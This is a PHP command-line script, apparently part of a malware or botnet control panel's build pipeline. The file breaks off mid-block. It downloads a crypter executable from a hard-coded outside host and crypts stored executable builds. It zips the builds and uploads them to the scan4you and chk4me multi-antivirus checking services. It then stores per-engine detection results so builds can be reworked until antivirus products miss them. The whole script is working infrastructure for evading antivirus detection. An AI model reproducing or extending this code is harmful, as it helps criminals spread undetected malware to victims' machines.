#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '256M');

function real_path($p){
    $r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    if(empty($r)){
	mkdir(str_replace('//', '/', str_replace('\\', '/', $p)));
	$r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    }
    return $r;
}

$dir = array();
$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['site'] = real_path($dir['script'] . '/../../');
$dir['orig'] = $dir['site'] . 'cache/originals/';
$dir['cfg'] = $dir['site'] . 'cfg/';

$debug = true;

if($debug == true){
    file_put_contents('debug.txt', '');
}

if(!extension_loaded ('zip')) exit;

ini_set('error_log', $dir['site'] . 'cache/builds_errors_php.txt');

function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8) file_put_contents($dir['site'] . 'cache/builds_errors_php.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

$pid_file = 'cache/builds.pid';

if(file_exists($dir['site'] . $pid_file)){
    if(IDOS === 'WIN'){
	$pid = file_get_contents($dir['site'] . $pid_file);
	if(stripos(exec('tasklist /FI "'.WIN_LOCALIZE_PID.' eq '.$pid.'"'), $pid) === false){
	    file_put_contents($dir['site'] . $pid_file, getmypid());
	    @chmod($dir['site'] . $pid_file, 0777);
	}else{
	    exit;
	}
    }else{
	$pid = file_get_contents($dir['site'] . $pid_file);
	if(stripos(exec('ps -p '.$pid), $pid) === false){
	    file_put_contents($dir['site'] . $pid_file, getmypid());
	    @chmod($dir['site'] . $pid_file, 0777);
	}else{
	    exit;
	}
    }
}else{
    file_put_contents($dir['site'] . $pid_file, getmypid());
    chmod($dir['site'] . $pid_file, 0777);
}

include_once($dir['site'] . 'includes/functions.av.php');

$cfg = json_decode(file_get_contents($dir['site'] . '/cache/config.json'), true);

if(empty($cfg['b_scan4you_id']) || empty($cfg['b_scan4you_token'])) exit;

if(!empty($cfg['b_chk4me_token'])){
    require_once($dir['site'] . 'classes/chk4me.lib.php');
    $checker = new AvcheckAPI(trim($cfg['b_chk4me_token']), 'chk4me.com');
}

//CRYPTOR_LINK START
$cryptor = array();
$cryptor['url'] = 'http://kthjq.org/crpt/Mystic.exe';
$cryptor['md5'] = 'http://kthjq.org/crpt/md5.php';
//CRYPTOR_LINK END

if(isset($cryptor) && is_array($cryptor)){
    $max_dl = 3;
    $cur_dl = 0;
    
    $error = array();
    $error['dl'] = false;
    $error['text'] = '';
    
    do{
	$next_dl = false;
    
	$md5 = @file_get_contents($cryptor['md5']);
	if(!empty($md5) && preg_match('~^\{(.*)\}$~', $md5)){
	    $md5 = json_decode($md5, true);
    
	    $file['new'] = $dir['site'] . 'cache/cryptor/CRYPTOR_NEW.EXE';
	    $file['local'] = $dir['site'] . 'cache/cryptor/CRYPTOR.EXE';
	    $file['bak'] = $dir['site'] . 'cache/cryptor/CRYPTOR.EXE.BAK';
    
	    $fp =fopen($file['new'],'w+b');
	    if($fp){
		$curl = curl_init($cryptor['url']);
		curl_setopt($curl, CURLOPT_FILE, $fp);
		curl_exec($curl);
		curl_close($curl);
		fclose($fp);
    
		if(md5_file($file['new']) == $md5[basename($cryptor['url'])]){
		    if(file_exists($file['bak'])) unlink($file['bak']);
    
		    rename($file['local'], $file['bak']);
		    @chmod($file['bak'], 0777);
    
		    rename($file['new'], $file['local']);
		    @chmod($file['local'], 0777);
    
		    $error['dl'] = false;
		    $error['text'] = '';
		}else{
		    $error['dl'] = true;
		    $error['text'] = 'MD5 FILE ERROR!';
		}
	    }else{
		$error['dl'] = true;
		$error['text'] = 'FILE CREATE ERROR!';
	    }
	}else{
	    $error['dl'] = true;
	    $error['text'] = 'MD5 GET ERROR!';
	}
    
	if(file_exists($file['new'])) unlink($file['new']);
    
	if($error['dl'] == true){
	    $next_dl = true;
    
	    if(!empty($cfg['jabber']['bt_tracking'])){
		$text = 'Error update cryptor!' . "\r\n";
		$text .= 'Cryptor link:  ' . $cryptor['url'] . "\r\n";
		$text .= 'Error text:  ' . $error['text'] . "\r\n";
    
		if(strpos($cfg['jabber']['bt_tracking'], ',') != false){
		    $jt = explode(',', $cfg['jabber']['bt_tracking']);
		    if($jt > 0){
			foreach($jt as $jab){
			    @file_put_contents($dir['site'] . 'cache/jabber/to_' . $jab . '_' . mt_rand(5, 15) . time(), $text);
			}
		    }
		}else{
		    @file_put_contents($dir['site'] . 'cache/jabber/to_' . $cfg['jabber']['bt_tracking'] . '_' . mt_rand(5, 15) . time(), $text);
		}
	    }
	}else{
	    $next_dl = false;
	}
    
	$cur_dl++;
    }while($next_dl == true && $cur_dl < $max_dl);
}

include_once($dir['site'] . 'includes/functions.get_config.php');
$cfg_db = get_config();

require_once($dir['site'] . 'classes/mysqli.class.php');
$mysqli = new mysqli_db();
$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

function debug_save($str){
    file_put_contents('debug.txt', $str . "\r\n", FILE_APPEND);
    print_r($str . "\r\n");
}

function curl_load($file, $in = 0){
    global $cfg;

    if($in < 3){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_VERBOSE, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 600);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
	curl_setopt($ch, CURLOPT_URL, trim($cfg['scan4u']));
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, array('id'=>$cfg['b_scan4you_id'],'token'=>$cfg['b_scan4you_token'],'action'=>'file','frmt'=>'json','uppload'=>'@'.$file));

	$return = curl_exec($ch);

	if(curl_getinfo($ch,CURLINFO_HTTP_CODE) == 200){
	    if(preg_match('~\{(.*)\}~is', $return)){
		return $return;
	    }else{
		if($return == 'ERROR: Sorry, no more than 2 paralel job'){
		    sleep(100);
		}else{
		    sleep(60);
		}
		return curl_load($file, ($in+1));
	    }
	}else{
	    sleep(30);
	    return curl_load($file, ($in+1));
	}
    }else{
	return false;
    }
}

function recrypt_build($row){
    global $dir, $mysqli, $cl, $max_file, $crypt, $debug;

    if(!empty($row->file_orig)){
	if($debug == true) debug_save('start crypt - ' . $row->id);
	$fcs = '/tmp/cryptor.sh';
	file_put_contents($fcs, '#!/bin/sh' . "\n");
	file_put_contents($fcs, 'cd ' . $dir['site'] . 'cache/cryptor/' . "\n", FILE_APPEND);
	file_put_contents($fcs, $dir['script'] . '/builds_crypt.php ' . $row->id . ' > /dev/null &', FILE_APPEND);
	chmod($fcs, 0777);
	@system($fcs);
	
	sleep(5);
	
	$cl[0][] = $row;
    }
    
    /*
    $dir['cryptor'] = $dir['site'] . 'cache/cryptor/' . $row->id . '/';
    if(!file_exists($dir['cryptor'])){
	if(!mkdir($dir['cryptor'])) return false;
    }

    if(empty($row->file_crypt)){
	unset($row->file_crypt);
	$mysqli->query('update bf_builds set file_crypt = \'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
    }else{
	copy($dir['cfg'] . $row->file_crypt, $dir['cryptor'] . 'previous_minav.exe');
	chmod($dir['cryptor'] . 'previous_minav.exe', 0777);
    }

    $to_sh = '';
    for($i = 1; $i <= $max_file; $i++){
	copy($dir['orig'] . $row->file_orig, $dir['cryptor'] . $i . '.exe');
	chmod( $dir['cryptor'] . $i . '.exe', 0777);
	$to_sh .= '/usr/bin/wine ' . $dir['site'] . 'cache/cryptor/CRYPTOR.EXE ' . $row->id . '/' . $i . '.exe' . "\n";
    }

    file_put_contents('/tmp/cryptor.sh', '#!/bin/sh' . "\n");
    file_put_contents('/tmp/cryptor.sh', 'cd ' . $dir['site'] . 'cache/cryptor/' . "\n", FILE_APPEND);
    file_put_contents('/tmp/cryptor.sh', $to_sh, FILE_APPEND);
    chmod('/tmp/cryptor.sh', 0777);
    @system('/tmp/cryptor.sh');
    unlink('/tmp/cryptor.sh');

    $mysqli->query('update bf_builds set status = \'2\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');

    $zip_name = $dir['cryptor'] . $row->md5 . '.zip';
    if(file_exists($zip_name)) unlink($zip_name);
    $zip = new ZipArchive;
    $res = $zip->open($zip_name, ZIPARCHIVE::OVERWRITE);
    if($res === TRUE){
	for($i = 1; $i <= $max_file; $i++){
	    $zip->addFile($dir['cryptor'] . $i . '.exe', $i . '.exe');
	}
    }

    if(!empty($row->file_crypt)) $zip->addFile($dir['cryptor'] . 'previous_minav.exe', 'previous_minav.exe');
    $zip->close();

    $mysqli->query('update bf_builds set status = \'5\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
    */
}

function add_build($row){
    global $mysqli, $cl;
    if(!empty($row->file_orig)){
	$mysqli->query('update bf_builds set status = \'5\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	$cl[1][] = $row;
    }
}

function load_build($row){
    global $dir, $mysqli;
    
    if(empty($row->link)) return false;
    
    switch($row->type){
	case 1:
	    $fname = $dir['cfg'] . md5($row->link) . '.exe';
	break;
	
	case 2:
	case 3:
	case 4:
	case 5:
	    $fname = $dir['orig'] . md5($row->link) . '.exe';
	break;
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $row->link);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $return = curl_exec($ch);
    
    if(curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200){
	file_put_contents($fname, $return);
	$mysqli->query('update bf_builds set file_orig = \''.basename($fname).'\', status = \'0\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
    }else{
	$mysqli->query('update bf_builds set file_orig = \'\', status = \'84\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	@unlink($fname);
    }
    
    curl_close($ch);
}

function create_zip(&$res, $file_name, $z_name = ''){
    global $dir, $zip;

    if($res === TRUE){
	if(empty($z_name)){
	    $zip->addFile($file_name, basename($file_name));
	}else{
	    $zip->addFile($file_name, $z_name);
	}
    }else{
	return false;
    }
}

$crypt = array();
$crypt['pause'] = 3;
$crypt['cur'] = 0;
$crypt['sleep'] = 10;

$max_time = 900; // 15 min for chk4me
$max_file = 10;
$max_size = 6050283; // 5,77 megabyte for one zip

$cl = array();
$cl[0] = array();
$cl[1] = array();

$cdpc = scandir($dir['site'] . 'cache/pids/');
unset($cdpc[0], $cdpc[1]);
foreach($cdpc as $cdpci){
    unlink($dir['site'] . 'cache/pids/' . $cdpci);
}

$mysqli->query('SELECT * FROM bf_builds WHERE (link != \'\')', null, 'load_build');

$mysqli->query('SELECT * FROM bf_builds WHERE (type = \'1\') OR ((type = \'4\') AND (status != \'99\'))', null, 'add_build');

if(count($cl[1]) > 0){
    $zp = array();
    $zps = array();
    $next = false;
    $start = 0;
    $division = 1;
    $count_item = count($cl[1])-1;
    $max_division = 12;

    foreach($cl[1] as $row){
	$mysqli->query('update bf_builds set status = \'2\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
    }

    do{
	for($z = 1; $z <= $division; $z++){
	    if($debug == true) debug_save('start div - ' . $z);

	    $zp[$z] = $dir['site'] . '/cache/' . md5(time() . mt_rand() . $z) . '.zip';
	    if(file_exists($zp[$z])) $zp[$z] = $dir['site'] . '/cache/' . md5(time() . mt_rand() . $z) . '.zip';
	    $zip = new ZipArchive;
	    $res = $zip->open($zp[$z], ZIPARCHIVE::OVERWRITE);

	    $max_item = ceil($count_item / $division);

	    if($debug == true) debug_save('i start - ' . $start);
	    $cftz = '0';
	    for($i = 0; $i <= $max_item; $i++){
		$cftz++;
		$p = ($i+$start);
		if($res === TRUE){
		    if(isset($cl[1][$p])){
			$fnz = '';
			switch($cl[1][$p]->type){
			    case 1:
				$fnz = $dir['cfg'] . $cl[1][$p]->file_orig;
			    break;

			    case 4:
				$fnz = $dir['orig'] . $cl[1][$p]->file_orig;
			    break;
			}

			$fnz = trim($fnz);
			if(file_exists($fnz)){
			    if($debug == true) debug_save('zip - ' . $p . '_' . $cl[1][$p]->id . '_' . $cl[1][$p]->type . '.exe' . ' to '  . basename($zp[$z]));
			    $zip->addFile($fnz, $cl[1][$p]->id . '.' . $cl[1][$p]->type . '.exe');
			    //$zps[$cl[1][$p]->id] = $zp[$z];
			    $zps[basename($zp[$z])][$cl[1][$p]->id] = $cl[1][$p]->type;
			}else{
			    if($debug == true){
				debug_save('NotFile: ' . $p . '_' . $cl[1][$p]->id . '_' . $cl[1][$p]->type . '.exe');
				debug_save('NotFile: ' . $fnz);
			    }
			    $mysqli->query('update bf_builds set status = \'90\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$cl[1][$p]->id.'\') LIMIT 1');
			}
		    }
		}else{
		    $mysqli->query('update bf_builds set status = \'92\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$cl[1][$p]->id.'\') LIMIT 1');
		}
	    }
	    $start += $i;

	    $zip->close();

	    if($cftz > 15){
		$fsz = $max_size+10;
	    }else{
		$fsz = filesize($zp[$z]);
	    }

	    if($fsz > $max_size){
		foreach($zp as $zd){
		    @unlink($zd);
		}

		$division++;
		$start = 0;
		$p = 0;
		$next = true;

		if($debug == true){
		    debug_save('filesize - ' . $z);
		}

		unset($zps);
		$zps = array();

		unset($zp);
		$zp = array();

		break 1;
	    }else{
		if($debug == true) debug_save('Ok');
		$next = false;
	    }

	    unset($zip);
	}
    }while($next == true &&  $division <= $max_division);

    if($debug == true){
	debug_save(print_r($zp, true));
	debug_save(print_r($zps, true));
    }

    if($division == $max_division){
	foreach($cl[1] as $row){
	    $mysqli->query('update bf_builds set status = \'91\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	}
    }else{

	foreach($cl[1] as $row){
	    $mysqli->query('update bf_builds set status = \'5\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	}

	if(count($zp) > 0){
	    $chk4me = array();

	    foreach($zp as $file){
		foreach($zps[basename($file)] as $zp_key => $zp_item){
		    $mysqli->query('update bf_builds set status = \'3\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
		}

		if(!empty($cfg['b_chk4me_token'])){
		    if($debug == true) debug_save('upload chk4me - ' . basename($file));

		    foreach($zps[basename($file)] as $zp_key => $zp_item){
			$mysqli->query('update bf_builds set status = \'7\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
		    }

		    $checker->check($file, false);
		    $next_chk4me = false;
		    $max_chk4me = 10;
		    $cur_chk4me = 0;
		    do{
			$cur_chk4me++;
			$response = $checker->get_link();
			if(!empty($response['id'])){
			    $chk4me[$response['id']] = $file;
			}else{
			    $next_chk4me = true;
			}
			sleep(10);
		    }while($cur_chk4me < $max_chk4me && $next_chk4me == true);
		}

		foreach($zps[basename($file)] as $zp_key => $zp_item){
		    $mysqli->query('update bf_builds set status = \'3\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
		}

		if($debug == true) debug_save('upload scan4you - ' . basename($file));
		$result = curl_load($file);

		//$result = file_get_contents('test.json');
		if($result != false){
		    //file_put_contents('c4u', $result);
		    $result = json_decode($result);
		    $fu = array();
		    $avc = 0;
		    $avcs = '';
		    foreach($result as $av_key => $av_item){
			$av_key = av_replace($av_key);

			if(strpos(' ' . $avcs, $av_key . '|') == false){
			    $avc++;
			    $avcs .= $av_key . '|';
			}

			if(is_object($av_item)){
			    foreach($av_item as $av_file => $detect){
				$av_file = explode('.', $av_file, 3);

				if(!isset($fu[$av_file['0']])){
				    $fu[$av_file['0']]['av'] = '';
				    $fu[$av_file['0']]['avt'] = '';
				    $fu[$av_file['0']]['avcf'] = '0';
				}

				if(strpos(' ' . $fu[$av_file['0']]['av'], $av_key . '|') == false){
				    $fu[$av_file['0']]['av'] .= $av_key . '|';
				    $fu[$av_file['0']]['avt'] .= $av_key . ' ('.$detect.')|';
				    $fu[$av_file['0']]['avcf']++;
				}
			    }
			}elseif($av_item != 'OK'){
			    //print($item . "\r\n");
			    $av_item = explode('=', $av_item, 2);
			    $av_file = explode('.', $av_item[0], 3);

			    if(!isset($fu[$av_file[0]])){
				$fu[$av_file['0']]['av'] = '';
				$fu[$av_file['0']]['avt'] = '';
				$fu[$av_file['0']]['avcf'] = '0';
				$fu[$av_file['0']]['prio'] = '0';
			    }

			    if(strpos(' ' . $fu[$av_file['0']]['av'], $av_key . '|') == false){
				$fu[$av_file['0']]['av'] .= $av_key . '|';
				$fu[$av_file['0']]['avt'] .= $av_key . ' ('.$av_item[1].')|';
				$fu[$av_file['0']]['avcf']++;
			    }
			}

			$av_prio = array();
			foreach($fu as $kvc => $ivc){
			    $ivc['av'] = explode('|', trim($ivc['av'], '|'));
			    foreach($ivc['av'] as $kvp => $ivp){
				$ivp = av_replace($ivp);
				$av_prio[$kvc] += math_prio($ivp);
				$fu[$kvc]['prio'] = $av_prio[$kvc];
			    }
			}

			if(count($fu) > 0){
			    //print_r($fu);
			    foreach($fu as $mk => $mu){
				if($zps[basename($file)][$mk] == 4){
				    $mysqli->query('update bf_builds set status = \'99\', av = \''.$mu['av'].'\', avt = \''.$mu['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$mu['avcf'].'\', prio = \''.$mu['prio'].'\',   up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$mk.'\') LIMIT 1');
				}else{
				    if($mu['prio'] >= 5){
					$mysqli->query('update bf_builds set status = \'97\', av = \''.$mu['av'].'\', avt = \''.$mu['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$mu['avcf'].'\', prio = \''.$mu['prio'].'\',  up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$mk.'\') LIMIT 1');
				    }else{
					$mysqli->query('update bf_builds set status = \'98\', av = \''.$mu['av'].'\', avt = \''.$mu['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$mu['avcf'].'\', prio = \''.$mu['prio'].'\',   up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$mk.'\') LIMIT 1');
				    }
				}
			    }

			    foreach($zps[basename($file)] as $zp_key => $zp_item){
				if(!isset($fu[$zp_key])){
				    if($zp_item == 4){
					$mysqli->query('update bf_builds set status = \'99\', avcs = \''.$avcs.'\', avc = \''.$avc.'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
				    }else{
					$mysqli->query('update bf_builds set status = \'98\', avcs = \''.$avcs.'\', avc = \''.$avc.'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
				    }
				}
			    }
			}else{
			    /*
			    foreach($files as $f){
				$mysqli->query('update bf_builds set status = \'1\', avc = \''.$avc.'\', up_date = CURRENT_TIMESTAMP() WHERE (`md5` = \''.$f->md5.'\') LIMIT 1');
			    }
			    */
			    foreach($zps[basename($file)] as $zp_key => $zp_item){
				if($zp_item == 4){
				    $mysqli->query('update bf_builds set status = \'99\', avcs = \''.$avcs.'\', avc = \''.$avc.'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
				}else{
				    $mysqli->query('update bf_builds set status = \'98\', avcs = \''.$avcs.'\', avc = \''.$avc.'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
				}
			    }
			}
		    }
		    //$mysqli->query('update bf_builds set status = \'91\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
		    unlink($file);
		}else{
		    foreach($zps[basename($file)] as $zp_key => $zp_item){
			$mysqli->query('update bf_builds set status = \'94\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
		    }
		}
	    }
	}else{
	    foreach($cl[1] as $row){
		$mysqli->query('update bf_builds set status = \'89\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	    }
	}

	if(count($chk4me) > 0){
	    $start_time = time();
	    do{
		$cur_time = time();
		foreach($chk4me as $chk4me_id => $chk4me_file){

		    foreach($zps[basename($chk4me_file)] as $zp_key => $zp_item){
			$mysqli->query('update bf_builds set status = \'6\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') LIMIT 1');
		    }

		    $response = $checker->get_status($chk4me_id);
		    $response['status'] = mb_convert_encoding($response['status'], "UTF-8");

		    if($response['status'] == 'ok'){
			foreach($response['files'] as $chk4me_file){
			    $av_file = explode('.', $chk4me_file['name'], 3);
			    $av_item = $mysqli->query('SELECT id, file_orig, md5, status, prio, type, av, avt, avc, avcs, avcf FROM bf_builds WHERE (id = \''.$av_file[0].'\') AND (type=\''.$av_file[1].'\') LIMIT 1');

			    if($av_item->id == $av_file[0] && $av_item->type == $av_file[1]){
				$upd = array();
				$upd['av'] = $av_item->av;
				$upd['avt'] = $av_item->avt;
				$upd['avcf'] = $av_item->avcf;
				$upd['avc'] = $av_item->avc;
				$upd['avcs'] = $av_item->avcs;
				$upd['prio'] = $av_item->prio;

				foreach($chk4me_file['results'] as $chk4me_av => $chk4me_result){
				    $chk4me_result = mb_convert_encoding($chk4me_result, "UTF-8");
				    if($chk4me_result != 'OK' && !preg_match('~^Timeout~us', $chk4me_result)){
					$chk4me_av = mb_convert_encoding($chk4me_av, "UTF-8");
					$chk4me_av = av_replace($chk4me_av);

					if(strpos(' ' . $upd['avcs'], $chk4me_av . '|') == false){
					    $upd['avc']++;
					    $upd['avcs'] .= $chk4me_av . '|';
					}

					if(strpos(' ' . $av_item->av, $chk4me_av . '|') == false){
					    $upd['av'] .= $chk4me_av . '|';
					    $upd['avt'] .= $chk4me_av . ' ('.$chk4me_result.')|';
					    $upd['avcf']++;
					    $upd['prio'] += math_prio($chk4me_av);
					}
				    }
				}

				if($debug == true){
				    debug_save('-------------------------------------------------------------');
				    debug_save(print_r($av_item, true));
				    debug_save(print_r($upd, true));
				    debug_save('-------------------------------------------------------------');
				}

				if($upd['prio'] != $av_item->prio && $upd['avcf'] != $av_item->avcf){
				    if($av_item->type == 4){
					debug_save('update bf_builds set status = \'99\', av = \''.$upd['av'].'\', avt = \''.$upd['avt'].'\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', avcf = \''.$upd['avcf'].'\', prio = \''.$upd['prio'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
					$mysqli->query('update bf_builds set status = \'99\', av = \''.$upd['av'].'\', avt = \''.$upd['avt'].'\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', avcf = \''.$upd['avcf'].'\', prio = \''.$upd['prio'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
				    }else{
					if($upd['prio'] >= 5){
					    debug_save('update bf_builds set status = \'97\', av = \''.$upd['av'].'\', avt = \''.$upd['avt'].'\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', avcf = \''.$upd['avcf'].'\', prio = \''.$upd['prio'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
					    $mysqli->query('update bf_builds set status = \'97\', av = \''.$upd['av'].'\', avt = \''.$upd['avt'].'\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', avcf = \''.$upd['avcf'].'\', prio = \''.$upd['prio'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
					}else{
					    debug_save('update bf_builds set status = \'98\', av = \''.$upd['av'].'\', avt = \''.$upd['avt'].'\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', avcf = \''.$upd['avcf'].'\', prio = \''.$upd['prio'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
					    $mysqli->query('update bf_builds set status = \'98\', av = \''.$upd['av'].'\', avt = \''.$upd['avt'].'\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', avcf = \''.$upd['avcf'].'\', prio = \''.$upd['prio'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
					}
				    }
				    debug_save('-------------------------------------------------------------' . "\r\n");
				}else{
				    if($av_item->type == 4){
					$mysqli->query('update bf_builds set status = \'99\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
				    }else{
					if($upd['prio'] >= 5){
					    $mysqli->query('update bf_builds set status = \'97\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
					}else{
					    $mysqli->query('update bf_builds set status = \'98\', avc = \''.$upd['avc'].'\', avcs = \''.$upd['avcs'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$av_item->id.'\') LIMIT 1');
					}
				    }
				}
			    }
			}

			unset($chk4me[$chk4me_id]);
		    }elseif($response['status'] == 'error'){
			foreach($zps[basename($chk4me[$chk4me_id])] as $zp_key => $zp_item){
			    $mysqli->query('update bf_builds set status = \'87\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') AND ((`status` != \'98\') OR (`status` != \'99\')) LIMIT 1');
			}
			unset($chk4me[$chk4me_id]);
		    }
		}

		if($debug == true){
		    debug_save('chk4me check - ' . ($cur_time-$start_time));
		    if(is_array($response)) debug_save(print_r($response, true));
		}

		$cchk4me = count($chk4me);
		if($cchk4me > 0) sleep(30);
	    }while($cchk4me > 0 && ($cur_time-$start_time) <= $max_time);

	    if(count($chk4me) > 0){
		foreach($chk4me as $chk4me_id => $chk4me_file){
		    foreach($zps[basename($chk4me[$chk4me_id])] as $zp_key => $zp_item){
			$mysqli->query('update bf_builds set status = \'86\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$zp_key.'\') AND (`type` = \''.$zp_item.'\') AND ((`status` != \'98\') OR (`status` != \'99\')) LIMIT 1');
		    }
		}
	    }
	}
    }
}

sleep(10);

$mysqli->query('SELECT * FROM bf_builds WHERE (type = \'2\') OR (type = \'3\') OR ((type = \'5\') AND (status != \'99\'))', null, 'recrypt_build');

if(count($cl[0]) > 0){
    
    $max_crypt_time = 1800; //30 min
    $ccrypt = array();
    $start_time = time();
    do{
	foreach($cl[0] as $row){
	    if(file_exists($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $row->md5 . '.zip')){
		unset($ccrypt[$row->id . '_' . $row->md5]);
	    }else{
		$ccrypt[$row->id . '_' . $row->md5] = true;
	    }
	}
	//if($debug == true) debug_save(print_r($ccrypt, true));
	$cur_time = time();
	sleep(5);
    }while(count($ccrypt) > 0 && ($cur_time-$start_time) <= $max_crypt_time);
    
    /*
    do{
	$cdpc = scandir($dir['site'] . 'cache/pids/');
	unset($cdpc[0], $cdpc[1]);
	
	foreach($cdpc as $cdpci){
	    $pid = file_get_contents($dir['site'] . 'cache/pids/' . $cdpci);
	    if(stripos(exec('ps -p '.$pid), $pid) === false){
		sleep(10);
	    }else{
		unlink($dir['site'] . 'cache/pids/' . $cdpci);
	    }
	}
	
	if($debug == true) debug_save(print_r($cdpc, true));
    }while(count($cdpc) > 0);
    */
    foreach($cl[0] as $row){
	if(file_exists($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $row->md5 . '.zip')){
	    /*
	    if(!empty($cfg['b_chk4me_token'])){
		if($debug == true) debug_save('upload chk4me - ' . $row->id . '/' . $row->md5 . '.zip');

		$mysqli->query('update bf_builds set status = \'7\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');

		$checker->check($file, false);
		$next_chk4me = false;
		$max_chk4me = 10;
		$cur_chk4me = 0;
		do{
		    $cur_chk4me++;
		    $response = $checker->get_link();
		    if(!empty($response['id'])){
			$chk4me[$response['id']] = $file;
		    }else{
			$next_chk4me = true;
		    }
		    sleep(10);
		}while($cur_chk4me < $max_chk4me && $next_chk4me == true);
	    }
	    */
	    $mysqli->query('update bf_builds set status = \'3\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	    
	    if($debug == true) debug_save('upload scan4you - ' . $row->id . '/' . $row->md5 . '.zip');
